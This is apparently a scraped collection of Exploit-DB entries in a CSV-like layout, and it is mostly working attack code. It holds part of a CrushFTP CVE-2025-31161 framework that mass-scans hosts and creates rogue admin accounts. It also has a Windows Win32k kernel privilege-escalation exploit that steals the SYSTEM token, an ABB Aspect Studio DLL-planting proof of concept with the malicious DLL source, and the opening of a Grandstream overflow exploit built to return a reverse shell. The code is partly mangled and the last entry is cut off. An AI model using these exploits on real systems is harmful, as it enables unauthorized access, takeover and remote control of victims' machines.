""command"": ""setUserItem"", ""data_action"": ""replace"", ""serverGroup"": ""MainUsers"", ""username"": new_user, ""user"": f''' {new_user} {password} 1.0 / 6 0 (SITE_PASS)(SITE_DOT)(SITE_EMAILPASSWORD)(CONNECT) {target_user} {timestamp} true ''', ""xmlItem"": ""user"", ""vfs_items"": ' ', ""permissions"": ' (read)(write)(view)(delete)(resume)(makedir)(deletedir)(rename)(admin) ', ""c2f"": ""31If"" try: protocol = ""https"" if port == 443 else ""http"" url = f""{protocol}://{target_host}:{port}/WebInterface/function/"" response = self.session.post( url, headers=headers, data=payload, timeout=timeout if response.status_code == 200: # Verify the user was actually created if self.config.get(""verify_exploit"", True): if self._verify_user_created(target_host, new_user): self.target_manager.mark_as_exploited(target_host) console.print(f""[green][+][/green] Successfully created user [bold cyan]{new_user}[/bold cyan] on {target_host}"") return True else: console.print(f""[yellow][!][/yellow] User creation appeared successful but verification failed on {target_host}"") return False else: self.target_manager.mark_as_exploited(target_host) console.print(f""[green][+][/green] Successfully created user [bold cyan]{new_user}[/bold cyan] on {target_host}"") return True else: console.print(f""[red][-][/red] Failed to create user on {target_host} (Status: {response.status_code})"") return False except Exception as e: console.print(f""[red][-][/red] Error exploiting {target_host}: {e}"") return False def _verify_user_created(self, target_host: str, username: str) -> bool: """"""Verify that the user was successfully created."""""" # This is a placeholder for actual verification logic # In a real implementation, you would check if the user exists # For now, we'll just return True return True def scan_targets(self) -> None: """"""Scan all targets for vulnerability."""""" targets = self.target_manager.targets threads = self.config.get(""threads"", 10) if not targets: logging.error(""No targets specified"") return console.print(f""[bold cyan]Scanning {len(targets)} targets with {threads} threads...[/bold cyan]"") with Progress( TextColumn(""[progress.description]{task.description}""), BarColumn(), TextColumn(""[progress.percentage]{task.percentage:>3.0f}%""), TextColumn(""({task.completed}/{task.total})""), TimeRemainingColumn(), console=console ) as progress: task = progress.add_task(""[cyan]Scanning targets..."", total=len(targets)) with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor: future_to_target = {executor.submit(self.check_vulnerability, target): target for target in targets} for future in concurrent.futures.as_completed(future_to_target): progress.update(task, advance=1) # Display results vulnerable_count = len(self.target_manager.vulnerable_targets) console.print(f""\n[bold green]Scan complete![/bold green] Found {vulnerable_count} vulnerable targets."") if vulnerable_count > 0 and self.config.get(""verbose"", False): console.print(""\n[bold cyan]Vulnerable Targets:[/bold cyan]"") for target in self.target_manager.vulnerable_targets: console.print(f""[green]→[/green] {target}"") def exploit_targets(self) -> None: """"""Exploit vulnerable targets."""""" targets = self.target_manager.vulnerable_targets if self.config.get(""only_vulnerable"", True) else self.target_manager.targets threads = self.config.get(""threads"", 5) # Use fewer threads for exploitation if not targets: logging.error(""No targets to exploit"") return console.print(f""[bold red]Exploiting {len(targets)} targets with {threads} threads...[/bold red]"") with Progress( TextColumn(""[progress.description]{task.description}""), BarColumn(), TextColumn(""[progress.percentage]{task.percentage:>3.0f}%""), TextColumn(""({task.completed}/{task.total})""), TimeRemainingColumn(), console=console ) as progress: task = progress.add_task(""[red]Exploiting targets..."", total=len(targets)) with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor: future_to_target = {executor.submit(self.exploit, target): target for target in targets} for future in concurrent.futures.as_completed(future_to_target): progress.update(task, advance=1) # Display results exploited_count = len(self.target_manager.exploited_targets) console.print(f""\n[bold green]Exploitation complete![/bold green] Successfully exploited {exploited_count}/{len(targets)} targets."") if exploited_count > 0: console.print(""\n[bold cyan]Exploited Targets:[/bold cyan]"") for target in self.target_manager.exploited_targets: console.print(f""[green]→[/green] {target}"") def parse_arguments() -> argparse.Namespace: """"""Parse command line arguments."""""" parser = argparse.ArgumentParser( description=""CVE-2025-31161 Exploit Framework - Advanced CrushFTP WebInterface Vulnerability Scanner and Exploiter"", formatter_class=argparse.RawDescriptionHelpFormatter, epilog="""""" Examples: # Check a single target for vulnerability python cve_2025_31161.py --target example.com --check # Exploit a vulnerable target python cve_2025_31161.py --target example.com --exploit --new-user hacker --password P@ssw0rd # Scan multiple targets from a file python cve_2025_31161.py --file targets.txt --check --threads 20 # Scan and automatically exploit vulnerable targets python cve_2025_31161.py --file targets.txt --check --exploit --new-user hacker --password P@ssw0rd --auto-exploit # Export results to JSON format python cve_2025_31161.py --file targets.txt --check --output results.json --format json # Target specification target_group = parser.add_argument_group(""Target Specification"") target_group.add_argument(""--target"", help=""Single target host to scan/exploit"") target_group.add_argument(""--file"", help=""File containing list of targets (one per line)"") target_group.add_argument(""--port"", type=int, default=443, help=""Target port (default: 443)"") # Actions action_group = parser.add_argument_group(""Actions"") action_group.add_argument(""--check"", action=""store_true"", help=""Check targets for vulnerability"") action_group.add_argument(""--exploit"", action=""store_true"", help=""Exploit vulnerable targets"") action_group.add_argument(""--auto-exploit"", action=""store_true"", help=""Automatically exploit targets found to be vulnerable during check"") # Exploitation options exploit_group = parser.add_argument_group(""Exploitation Options"") exploit_group.add_argument(""--target-user"", default=""crushadmin"", help=""Target user for exploitation (default: crushadmin)"") exploit_group.add_argument(""--new-user"", help=""Username for the new admin account to create"") exploit_group.add_argument(""--password"", help=""Password for the new admin account"") exploit_group.add_argument(""--verify-exploit"", action=""store_true"", help=""Verify successful exploitation (default: True)"") # Scan options scan_group = parser.add_argument_group(""Scan Options"") scan_group.add_argument(""--threads"", type=int, default=10, help=""Number of concurrent threads (default: 10)"") scan_group.add_argument(""--timeout"", type=int, default=10, help=""Connection timeout in seconds (default: 10)"") scan_group.add_argument(""--deep-check"", action=""store_true"", help=""Perform deeper vulnerability checks"") scan_group.add_argument(""--only-vulnerable"", action=""store_true"", help=""Only exploit targets that were found vulnerable"") # Output options output_group = parser.add_argument_group(""Output Options"") output_group.add_argument(""--output"", help=""Output file for results"") output_group.add_argument(""--format"", choices=[""txt"", ""json"", ""csv""], default=""txt"", help=""Output format (default: txt)"") output_group.add_argument(""--verbose"", ""-v"", action=""store_true"", help=""Enable verbose output"") output_group.add_argument(""--quiet"", ""-q"", action=""store_true"", help=""Suppress all output except errors"") output_group.add_argument(""--log-file"", help=""Log file to write to"") output_group.add_argument(""--log-level"", choices=[""debug"", ""info"", ""warning"", ""error"", ""critical""], default=""info"", help=""Log level (default: info)"") # Advanced options advanced_group = parser.add_argument_group(""Advanced Options"") advanced_group.add_argument(""--proxy"", help=""Proxy to use for requests (e.g., http://127.0.0.1:8080)"") advanced_group.add_argument(""--user-agent"", help=""Custom User-Agent string"") advanced_group.add_argument(""--random-agent"", action=""store_true"", help=""Use a random User-Agent for each request"") advanced_group.add_argument(""--delay"", type=float, help=""Delay between requests in seconds"") advanced_group.add_argument(""--custom-headers"", help=""Custom headers as JSON string"") return parser.parse_args() def validate_args(args: argparse.Namespace) -> bool: """"""Validate command line arguments."""""" # Check if at least one target specification is provided if not args.target and not args.file: logging.error(""No target specified. Use --target or --file"") print(f""\nExample usage: python {sys.argv[0]} --target example.com --check"") print(f"" python {sys.argv[0]} --file example_targets.txt --check"") return False # Check if at least one action is specified if not args.check and not args.exploit: logging.error(""No action specified. Use --check or --exploit"") print(f""\nExample usage: python {sys.argv[0]} --target example.com --check"") print(f"" python {sys.argv[0]} --target example.com --exploit --new-user admin --password P@ssw0rd"") return False # If exploit action is specified, check for required parameters if args.exploit and (not args.new_user or not args.password): logging.error(""Exploitation requires --new-user and --password"") print(f""\nExample usage: python {sys.argv[0]} --target example.com --exploit --new-user admin --password P@ssw0rd"") return False return True def main() -> None: """"""Main function."""""" # Parse command line arguments args = parse_arguments() # Configure logging log_level = ""error"" if args.quiet else args.log_level setup_logging(log_level, args.log_file) # Display banner if not args.quiet: console.print(BANNER) # Validate arguments if not validate_args(args): sys.exit(1) # Create target manager target_manager = TargetManager(args.file, args.target) # Build configuration dictionary config = { ""port"": args.port, ""threads"": args.threads, ""timeout"": args.timeout, ""verbose"": args.verbose, ""deep_check"": args.deep_check, ""target_user"": args.target_user, ""new_user"": args.new_user, ""password"": args.password, ""only_vulnerable"": args.only_vulnerable, ""verify_exploit"": args.verify_exploit, ""proxy"": args.proxy, # Add custom headers if provided if args.custom_headers: try: config[""custom_headers""] = json.loads(args.custom_headers) except json.JSONDecodeError: logging.error(""Invalid JSON format for custom headers"") sys.exit(1) # Add custom user agent if provided if args.user_agent: config[""user_agent""] = args.user_agent # Create exploit engine engine = ExploitEngine(target_manager, config) # Perform actions if args.check: engine.scan_targets() if args.exploit or (args.auto_exploit and target_manager.vulnerable_targets): engine.exploit_targets() # Save results if output file is specified if args.output: target_manager.save_results(args.output, args.format) # Display summary if not args.quiet: console.print(""\n[bold green]Summary:[/bold green]"") console.print(f""Total targets: {len(target_manager.targets)}"") console.print(f""Vulnerable targets: {len(target_manager.vulnerable_targets)}"") console.print(f""Exploited targets: {len(target_manager.exploited_targets)}"") if __name__ == ""__main__"": try: main() except KeyboardInterrupt: console.print(""\n[bold red]Operation cancelled by user[/bold red]"") sys.exit(0) except Exception as e: logging.error(f""Unhandled exception: {e}"") sys.exit(1)"
CVE-2023-29336,2025-05-25,exploit db,"# Exploit Title: Microsoft Windows Server 2016 - Win32k Elevation of Privilege # Date: 2025-05-19 # Exploit Author: Milad Karimi (Ex3ptionaL) # Contact: miladgrayhat@gmail.com # Zone-H: www.zone-h.org/archive/notifier=Ex3ptionaL # Country: United Kingdom # CVE : CVE-2023-29336 #include #include #include #define IDM_MYMENU 101 #define IDM_EXIT 102 #define IDM_DISABLE 0xf120 #define IDM_ENABLE 104 #define EPROCESS_UNIQUE_PROCESS_ID_OFFSET 0x440 #define EPROCESS_ACTIVE_PROCESS_LINKS_OFFSET 0x448 #define EPROCESS_TOKEN_OFFSET 0x4b8 typedef DWORD64(NTAPI* NtUserEnableMenuItem)(HMENU hMenu, UINT uIDEnableItem, UINT uEnable); typedef DWORD64(NTAPI* NtUserSetClassLongPtr)(HWND a1, unsigned int a2, unsigned __int64 a3, unsigned int a4); typedef DWORD64(NTAPI* NtUserCreateAcceleratorTable)(void* Src, int a2); typedef DWORD64(NTAPI* fnNtUserConsoleControl)(int nConsoleCommand, PVOID, int nConsoleInformationLength); NtUserSetClassLongPtr g_NtUserSetClassLongPtr = NULL; NtUserEnableMenuItem g_NtUserEnableMenuItem = NULL; NtUserCreateAcceleratorTable g_NtUserCreateAcceleratorTable = NULL; fnNtUserConsoleControl g_pfnNtUserConsoleControl = nullptr; LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam); int syytem(); typedef struct _SHELLCODE { DWORD reserved; DWORD pid; DWORD off_THREADINFO_ppi; DWORD off_EPROCESS_ActiveLink; DWORD off_EPROCESS_Token; BOOL bExploited; BYTE pfnWindProc[]; } SHELLCODE, * PSHELLCODE; struct tagMENU ULONG64 field_0; ULONG64 field_8; ULONG64 field_10; ULONG64 field_18; ULONG64 field_20; PVOID obj28; DWORD field_30; DWORD flag1; DWORD flag2; DWORD cxMenu; DWORD cyMenu; ULONG64 field_48; PVOID rgItems; ULONG64 field_58; // + 0x58 ULONG64 field_60; ULONG64 field_68; ULONG64 field_70; ULONG64 field_78; ULONG64 field_80; ULONG64 field_88; ULONG64 field_90; PVOID ref; // + 0x98 struct MyData BYTE name[0x96]; tagMENU* g_pFakeMenu = 0; static PSHELLCODE pvShellCode = NULL; HMENU hSystemMenu; HMENU hMenu; HMENU hSubMenu; HMENU hAddedSubMenu; HMENU hMenuB; PVOID MENU_add = 0; DWORD flag = 0; UINT iWindowCount = 0x100; HWND HWND_list[0x300]; HWND HWND_list1[0x20]; HMENU HMENUL_list[0x300]; int Hwnd_num = 0; int Hwnd_num1 = 0; ULONGLONG HWND_add = 0; ULONGLONG GS_off = 0; WORD max = 0; static PULONGLONG ptagWNDFake = NULL; static PULONGLONG ptagWNDFake1 = NULL; static PULONGLONG ptagWNDFake2 = NULL; static PULONGLONG GS_hanlde = NULL; static PULONGLONG HWND_class = NULL; struct ThreadParams { int threadId; int numLoops; static unsigned long long GetGsValue(unsigned long long gsValue) return gsValue; PVOID GetMenuHandle(HMENU menu_D) int conut = 0; PVOID HANDLE = 0; PBYTE add = 0; WORD temp = 0; DWORD offset = 0xbd688; HMODULE hModule = LoadLibraryA(""USER32.DLL""); PBYTE pfnIsMenu = (PBYTE)GetProcAddress(hModule, ""IsMenu""); ULONGLONG par1 = 0; DWORD par2 = 0; memcpy((VOID*)&par1, (char*)((ULONGLONG)hModule + offset), 0x08); memcpy((VOID*)&par2, (char*)((ULONGLONG)hModule + offset + 0x08), 0x02); add = (PBYTE)(par1 + 0x18 * (WORD)menu_D); if (add) HANDLE = *(PVOID*)add; else HANDLE = 0; HANDLE= (PVOID*)((ULONGLONG)HANDLE - GS_off+0x20); return *(PVOID*)HANDLE; PVOID xxGetHMValidateHandle(HMENU menu_D, DWORD type_hanlde) int conut = 0; PVOID HANDLE = 0; PBYTE add = 0; WORD temp = 0; DWORD offset = 0xbd688; HMODULE hModule = LoadLibraryA(""USER32.DLL""); PBYTE pfnIsMenu = (PBYTE)GetProcAddress(hModule, ""IsMenu""); ULONGLONG par1 = 0; DWORD par2 = 0; memcpy((VOID*)&par1, (char*)((ULONGLONG)hModule + offset), 0x08); memcpy((VOID*)&par2, (char*)((ULONGLONG)hModule + offset + 0x08), 0x02); temp = (ULONGLONG)menu_D >> 16; add = (PBYTE)(par1 + 0x18 * (WORD)menu_D); if (add) HANDLE = *(PVOID*)add; else HANDLE = 0; HANDLE = (PVOID*)((ULONGLONG)HANDLE - GS_off + 0x20); return *(PVOID*)HANDLE; static VOID xxReallocPopupMenu(VOID) for (INT i = 0; i < 0x8; i++) WNDCLASSEXW Class = { 0 }; WCHAR szTemp[0x100] = { 0 }; HWND hwnd = NULL; wsprintfW(szTemp, L""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@A%d"", i); Class.cbSize = sizeof(WNDCLASSEXA); Class.lpfnWndProc = DefWindowProcW; Class.cbWndExtra = 0; Class.hInstance = GetModuleHandleA(NULL); Class.lpszMenuName = NULL; Class.lpszClassName = szTemp; if (!RegisterClassExW(&Class)) continue; VOID createclass(VOID) WCHAR szTemp[0x100] = { 0 }; for (INT i = 9; i < 29; i++) WNDCLASSEXW Class = { 0 }; HWND hwnd = NULL; wsprintfW(szTemp, L""A@A%d"", i); Class.cbSize = sizeof(WNDCLASSEXA); Class.lpfnWndProc = DefWindowProcW; Class.cbWndExtra = 0x20; Class.hInstance = GetModuleHandleA(NULL); Class.lpszMenuName = NULL; Class.lpszClassName = szTemp; Class.cbClsExtra = 0x1a0; if (!RegisterClassExW(&Class)) continue; for (INT i = 9; i < 29; i++) wsprintfW(szTemp, L""A@A%d"", i); HWND_list1[i]=CreateWindowEx(NULL, szTemp, NULL, WS_VISIBLE, 0, 0, 0, 0, NULL,NULL, NULL, NULL); ULONG64 Read64(ULONG64 address) MENUBARINFO mbi = { 0 }; mbi.cbSize = sizeof(MENUBARINFO); g_pFakeMenu->rgItems = PVOID(address - 0x48); GetMenuBarInfo(HWND_list[max+1], OBJID_MENU, 1, &mbi); return (unsigned int)mbi.rcBar.left + ((ULONGLONG)mbi.rcBar.top << 32); void exploit() for (int i = 0; i < 0x20; i++) ULONG64 pmenu = SetClassLongPtr(HWND_list1[i], 0x270, (LONG_PTR)g_pFakeMenu); if (pmenu != 0) Hwnd_num = i; MENUBARINFO mbi = { 0 }; mbi.cbSize = sizeof(MENUBARINFO); ULONG64 p = Read64(HWND_add +0x250+ 0x10); // USER_THREADINFO p = Read64(p); //THREADINFO p = Read64(p + 0x220); // (PROCESSINFO) ULONG64 eprocess = p; printf(""Current EPROCESS = %llx\n"", eprocess); p = Read64(p + 0x2f0); do { p = Read64(p + 0x08); ULONG64 pid = Read64(p - 0x08); if (pid == 4) { ULONG64 pSystemToken = Read64(p + 0x68); printf(""pSys/tem Token = %llx \n"", pSystemToken); HWND_class = (PULONGLONG)((PBYTE)0x303000); HWND_class[8] = eprocess + 0x290; HWND_class[12] = 0x100; HWND_class[20] = 0x303010; ULONG64 ret_add = SetClassLongPtr(HWND_list1[Hwnd_num], 0x250 + 0x98 - 0xa0, (LONG_PTR)HWND_class); SetClassLongPtr(HWND_list[max + 1], 0x28, pSystemToken); ret_add = SetClassLongPtr(HWND_list1[Hwnd_num], 0x250 + 0x98 - 0xa0, (LONG_PTR)ret_add); break; } while (p != eprocess); syytem(); void buildmem() WORD max_handle = 0; pvShellCode = (PSHELLCODE)VirtualAlloc((PVOID)0x300000, 0x10000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); if (pvShellCode == NULL) return; ZeroMemory(pvShellCode, 0x10000); ptagWNDFake = (PULONGLONG)((PBYTE)0x304140); ptagWNDFake[0] = (ULONGLONG)0x304140; ptagWNDFake[2] = (ULONGLONG)0x304140 + 0x10; ptagWNDFake[6] = (ULONGLONG)0x304140; ptagWNDFake[8] = 0x305300; ptagWNDFake[11] = (ULONGLONG)MENU_add; ptagWNDFake[68] = (ULONGLONG)0x304140 + 0x230; ptagWNDFake[69] = (ULONGLONG)0x304140 + 0x28; ptagWNDFake[70] = (ULONGLONG)0x304140 + 0x30; ptagWNDFake[71] = (ULONGLONG)0x000004; ptagWNDFake1 = (PULONGLONG)((PBYTE)0x305300); ptagWNDFake1[1] = (ULONGLONG)0x11; ptagWNDFake1[2] = (ULONGLONG)0x305320; ptagWNDFake1[6] = (ULONGLONG)0x1000000000020000; ptagWNDFake1[8] = (ULONGLONG)0x00000000029d0000; ptagWNDFake1[11] = (ULONGLONG)HWND_add + 0x63 - 0x120; ptagWNDFake1[14] = (ULONGLONG)0x306500; ptagWNDFake1[16] = (ULONGLONG)305400; ptagWNDFake2 = (PULONGLONG)((PBYTE)0x306500); ptagWNDFake1[11] = (ULONGLONG)0x306600; WNDCLASSEX WndClass = { 0 }; WndClass.cbSize = sizeof(WNDCLASSEX); WndClass.lpfnWndProc = DefWindowProc; WndClass.style = CS_VREDRAW | CS_HREDRAW; WndClass.cbWndExtra = 0xe0; WndClass.hInstance = NULL; WndClass.lpszMenuName = NULL; WndClass.lpszClassName = L""NormalClass""; RegisterClassEx(&WndClass); for (int i = 0; i < 0x200; i++) HMENUL_list[i] = CreateMenu(); for (int i = 0; i < 0x100; i++) HWND_list[i] = CreateWindowEx(NULL, L""NormalClass"", NULL, WS_VISIBLE, 0, 0, 0, 0, NULL, HMENUL_list[i], NULL, NULL); for (int i = 0; i < 0x100; i++) SetWindowLongPtr(HWND_list[i], 0x58, (LONG_PTR)0x0002080000000000); SetWindowLongPtr(HWND_list[i], 0x80, (LONG_PTR)0x0000303030000000); for (int i = 0x20; i < 0x60; i++) if ((ULONGLONG)xxGetHMValidateHandle((HMENU)HWND_list[i * 2], 0x01)- (ULONGLONG)xxGetHMValidateHandle((HMENU)HWND_list[i * 2 - 1], 0x01)== 0x250) if ((ULONGLONG)xxGetHMValidateHandle((HMENU)HWND_list[i * 2 + 1], 0x01)-(ULONGLONG)xxGetHMValidateHandle((HMENU)HWND_list[i * 2], 0x01) == 0x250) HWND_add = (ULONGLONG)xxGetHMValidateHandle((HMENU)HWND_list[i*2], 0x01); max = i * 2; break; if (i == 0x5f) HWND_add = 0; ptagWNDFake1[11] = (ULONGLONG)HWND_add + 0x63 - 0x120; DestroyWindow(HWND_list[max]); createclass(); PVOID hHeap = (PVOID)0x302000; g_pFakeMenu = (tagMENU*)(PVOID)0x302000; g_pFakeMenu->ref = (PVOID)0x302300; *(PULONG64)g_pFakeMenu->ref = (ULONG64)g_pFakeMenu; g_pFakeMenu->obj28 = (PVOID)0x302200; *(PULONG64)((PBYTE)g_pFakeMenu->obj28 + 0x2C) = 1; g_pFakeMenu->rgItems = (PVOID)0x304000; g_pFakeMenu->flag1 = 1; g_pFakeMenu->flag2 = 1; g_pFakeMenu->cxMenu = 1; g_pFakeMenu->cyMenu = 1; int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) ULONGLONG gsValue = 0; unsigned char shellcode[] = ""\x65\x48\x8B\x04\x25\x30\x00\x00\x00\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc3""; LPVOID executableMemory = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); if (executableMemory == NULL) { return 1; memcpy(executableMemory, shellcode, sizeof(shellcode)); gsValue = ((ULONGLONG(*)())executableMemory)(); gsValue = gsValue + 0x800; GS_hanlde = (PULONGLONG)(PBYTE)gsValue; GS_off = GS_hanlde[5]; char str[0xb8] = """"; memset(str, 0x41, 0xa8); g_NtUserEnableMenuItem = (NtUserEnableMenuItem)GetProcAddress(GetModuleHandleA(""win32u.dll""), ""NtUserEnableMenuItem""); g_NtUserSetClassLongPtr = (NtUserSetClassLongPtr)GetProcAddress(GetModuleHandleA(""win32u.dll""), ""NtUserSetClassLongPtr""); g_NtUserCreateAcceleratorTable = (NtUserCreateAcceleratorTable)GetProcAddress(GetModuleHandleA(""win32u.dll""), ""NtUserCreateAcceleratorTable""); g_pfnNtUserConsoleControl = (fnNtUserConsoleControl)GetProcAddress(GetModuleHandleA(""win32u.dll""), ""NtUserConsoleControl""); WNDCLASS wc = { 0 }; wc.lpfnWndProc = WndProc; wc.hInstance = hInstance; wc.lpszClassName = TEXT(""EnableMenuItem""); RegisterClass(&wc); HWND hWnd = CreateWindow( wc.lpszClassName, TEXT(""EnableMenuItem""), WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, 400, 300, NULL, NULL, hInstance, NULL if (!hWnd) return FALSE; hSystemMenu = GetSystemMenu(hWnd, FALSE); hSubMenu = CreatePopupMenu(); MENU_add = GetMenuHandle(hSubMenu); hMenuB = CreateMenu(); buildmem(); if (HWND_add == 0) return 0; AppendMenu(hSubMenu, MF_STRING, 0x2061, TEXT(""0"")); AppendMenu(hSubMenu, MF_STRING, 0xf060, TEXT(""1"")); DeleteMenu(hSystemMenu, SC_CLOSE, MF_BYCOMMAND); AppendMenu(hMenuB, MF_POPUP, (UINT_PTR)hSubMenu, L""Menu A""); AppendMenu(hSystemMenu, MF_POPUP, (UINT_PTR)hMenuB, L""Menu B""); ShowWindow(hWnd, nCmdShow); UpdateWindow(hWnd); flag = 1; g_NtUserEnableMenuItem(hSystemMenu, 0xf060, 0x01); exploit(); MSG msg = { 0 }; while (GetMessage(&msg, NULL, 0, 0)) TranslateMessage(&msg); DispatchMessage(&msg); return (int)msg.wParam; LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam) switch (message) case WM_DESTROY: PostQuitMessage(0); return 0; case 0xae: switch (wParam) case 0x1000: if (flag) int itemCount = GetMenuItemCount(hMenuB); for (int i = itemCount - 1; i >= 0; i--) { RemoveMenu(hMenuB, i, MF_BYPOSITION); DestroyMenu(hSubMenu); xxReallocPopupMenu(); case 0x1001: if (flag) int itemCount = GetMenuItemCount(hMenuB); for (int i = itemCount - 1; i >= 0; i--) { RemoveMenu(hMenuB, i, MF_BYPOSITION); DestroyMenu(hSubMenu); xxReallocPopupMenu(); return 0; break; return DefWindowProc(hWnd, message, wParam, lParam); int syytem() SECURITY_ATTRIBUTES sa; HANDLE hRead, hWrite; byte buf[40960] = { 0 }; STARTUPINFOW si; PROCESS_INFORMATION pi; DWORD bytesRead; RtlSecureZeroMemory(&si, sizeof(si)); RtlSecureZeroMemory(π, sizeof(pi)); RtlSecureZeroMemory(&sa, sizeof(sa)); int br = 0; sa.nLength = sizeof(SECURITY_ATTRIBUTES); sa.lpSecurityDescriptor = NULL; sa.bInheritHandle = TRUE; if (!CreatePipe(&hRead, &hWrite, &sa, 0)) return -3; si.cb = sizeof(STARTUPINFO); GetStartupInfoW(&si); si.hStdError = hWrite; si.hStdOutput = hWrite; si.wShowWindow = SW_HIDE; si.lpDesktop = L""WinSta0\\Default""; si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES; wchar_t cmd[4096] = { L""cmd.exe"" }; if (!CreateProcessW(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, CloseHandle(hWrite); CloseHandle(hRead); printf(""[!] CreateProcessW Failed![%lx]\n"", GetLastError()); return -2; CloseHandle(hWrite);"
CVE-2024-13946,2025-05-25,exploit db,"# Exploit Title: ABB Cylon Aspect Studio 3.08.03 - Binary Planting # Vendor: ABB Ltd. # Product web page: https://www.global.abb # Affected version: <=3.08.03 # Tested on: Microsoft Windows 10 Home (EN) OpenJDK 64-Bit Server VM Temurin-21.0.6+7 # Vulnerability discovered by Gjoko 'LiquidWorm' Krstic @zeroscience # Advisory ID: ZSL-2025-5952 # Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2025-5952.php # CVE ID: CVE-2024-13946 # CVE URL: https://www.cve.org/CVERecord/SearchResults?query=CVE-2024-13946 C:\> type project P R O J E C T C:\Aspect\Aspect-Studio-3.08.03> del CylonLicence.dll C:\Aspect\Aspect-Studio-3.08.03> type aspect.bat REM 64bit parameters jre\bin\javaw -Dormlite.networkpoint.load=true -Dfile.encoding=""UTF-8"" -DlookAndFeel=nimbus -DMapGraphic.forceLoad=0 -DBACnet.discovery.driverPort=4224 -DBACnet.discovery.debugLevel=0 -Djava.library.path=. -DportPool.maxPortWaitTime=10000 -DOverride.enabled=false -Dlog4j.configuration=./log4j.aspectstudio.properties -Dswing.noxp=true -Dsun.java2d.d3d=false -Dsun.java2d.noddraw=true -XX:+UseG1GC -XX:MaxGCPauseMillis=200 -XX:InitiatingHeapOccupancyPercent=25 -Xss256k -Xms1024m -Xmx4096m -jar AspectStudioObf.jar C:\Aspect\Aspect-Studio-3.08.03-a09>aspect.bat C:\Aspect\Aspect-Studio-3.08.03-a09>REM 64bit parameters C:\Aspect\Aspect-Studio-3.08.03-a09>jre\bin\javaw -Dormlite.networkpoint.load=true -Dfile.encoding=""UTF-8"" -DlookAndFeel=nimbus -DMapGraphic.forceLoad=0 -DBACnet.discovery.driverPort=4224 -DBACnet.discovery.debugLevel=0 -Djava.library.path=. -DportPool.maxPortWaitTime=10000 -DOverride.enabled=false -Dlog4j.configuration=./log4j.aspectstudio.properties -Dswing.noxp=true -Dsun.java2d.d3d=false -Dsun.java2d.noddraw=true -XX:+UseG1GC -XX:MaxGCPauseMillis=200 -XX:InitiatingHeapOccupancyPercent=25 -Xss256k -Xms1024m -Xmx4096m -jar AspectStudioObf.jar C:\Aspect\Aspect-Studio-3.08.03> type AspectStudio.class System.loadLibrary(""CylonLicence""); } catch (Throwable t) {} LoggerUtil.logger.error(""Error loading license DLL"", t); C:\Aspect\Aspect-Studio-3.08.03> cd logs C:\Aspect\Aspect-Studio-3.08.03\logs>type AspectStudio.log ERROR: 2025-01-16 16:47:58,579 Error loading license DLL [main] java.lang.UnsatisfiedLinkError: no CylonLicence in java.library.path at java.lang.ClassLoader.loadLibrary(ClassLoader.java:1867) at java.lang.Runtime.loadLibrary0(Runtime.java:870) at java.lang.System.loadLibrary(System.java:1122) at com.aamatrix.util.AspectStudio. (AspectStudio.java:42) at com.aamatrix.vib.rrobin.CylonLicense. (CylonLicense.java:18) at com.aamatrix.vib.rrobin.LicenseService. (LicenseService.java:38) at com.aamatrix.vib.rrobin.LicenseService. (LicenseService.java:34) at com.aamatrix.projectmanager.AspectStudio. (AspectStudio.java:52) at java.lang.Class.forName0(Native Method) at java.lang.Class.forName(Class.java:348) at com.aamatrix.projectmanager.AspectStudioLauncher.main(AspectStudioLauncher.java:70) C:\DLL-Mala> type CylonLicence.cpp #define WIN32_LEAN_AND_MEAN #include #include extern ""C"" __declspec(dllexport) DWORD WINAPI ExecuteCmdThread(LPVOID lpParam) { ShellExecuteW(NULL, L""open"", L""cmd.exe"", L""/c start"", NULL, SW_SHOWNORMAL); return 0; extern ""C"" __declspec(dllexport) BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) { switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: CreateThread(NULL, 0, ExecuteCmdThread, NULL, 0, NULL); break; case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; return TRUE;"
CVE-2022-2070,2025-05-25,exploit db,"#!/usr/bin/env python3 # Exploit Title: Grandstream GSD3710 1.0.11.13 - Stack Buffer Overflow # Google Dork: [if applicable] # Date: 2025-05-23 # Exploit Author: Pepelux (user in ExploitDB) # Vendor Homepage: https://www.grandstream.com/ # Software Link: [download link if available] # Version: Grandstream GSD3710 - firmware:1.0.11.13 and lower # Tested on: Linux and MacOS # CVE: CVE-2022-2070 Author: Jose Luis Verdeguer (@pepeluxx) Required: Pwntools Example: Terminal 1: $ ncat -lnvp 4444 Terminal 2: $ python 3 CVE-2020-2070.py -ti DEVICE_IP -tp 8081 -ri LOCAL_IP -rp 4444 from operator import ge import sys import time from pwn import * import argparse def get_args(): parser = argparse.ArgumentParser( formatter_class=lambda prog: argparse.RawDescriptionHelpFormatter( prog, max_help_position=50)) # Add arguments parser.add_argument('-ti', '--target_ip', type=str, required=True, help='device IP address', dest=""device_ip"") parser.add_argument('-tp', '--target_port', type=int, required=True, default=8081, help='device port', dest=""device_port"") parser.add_argument('-ri', '--reverse_ip', type=str, required=True, help='reverse IP address', dest=""reverse_ip"") parser.add_argument('-rp', '--reverse_port', type=int, required=True, help='reverse port', dest=""reverse_port"") # Array for all arguments passed to script args = parser.parse_args() try: TI = args.device_ip TP = args.device_port RI = args.reverse_ip RP = args.reverse_port return TI, TP, RI, RP except ValueError: exit() def check_badchars(data): for i in range(len(data)): if data[i] in [0x0, 0x40]: log.warn(""Badchar %s detected at %#x"" % (hex(data[i]), i)) return True return False def 